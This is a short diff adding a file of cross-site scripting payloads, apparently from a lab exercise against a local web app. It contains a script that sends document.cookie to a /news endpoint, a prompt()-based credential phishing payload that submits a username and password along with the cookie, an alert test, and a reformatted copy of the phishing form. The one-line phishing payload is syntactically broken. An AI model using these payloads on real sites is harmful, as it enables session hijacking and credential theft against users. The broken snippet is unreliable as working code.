@@ -1,0 +1,35 @@
+alice <script> var request = new XMLHttpRequest(); request.open("GET","http://localhost:5000/news?text=" + document.cookie , true); request.send(null);</script>
+
+<script>var username = prompt("Please enter your username", "");var password = prompt("Please enter your password", "");var form=document.createElement("form");form.method="GET";form.action="news?text="document.cookie;var userField=document.createElement("input");userField.type="text"userField.name="username";userField.value = username;var passwordField = document.createElement("input");passwordField.type="password";passwordField.name="password";passwordField.value=password;form.appendChild(userField);form.appendChild(passwordField);document.body.appendChild(form);form.submit();</script>
+
+
+
+
+<script>alert("attacked")</script>
+
+
+<script>
+
+var form=document.createElement("form");
+form.method="GET";
+form.action="/news?text="+document.cookie;
+
+var userField=document.createElement("input");
+userField.type="text";
+userField.name="username";
+userField.value = username;
+
+var passwordField = document.createElement("input");
+passwordField.type="password";
+passwordField.name="password";
+passwordField.value=password;
+
+
+form.appendChild(userField);
+form.appendChild(passwordField);
+
+document.body.appendChild(form);
+
+form.submit();
+
+</script>
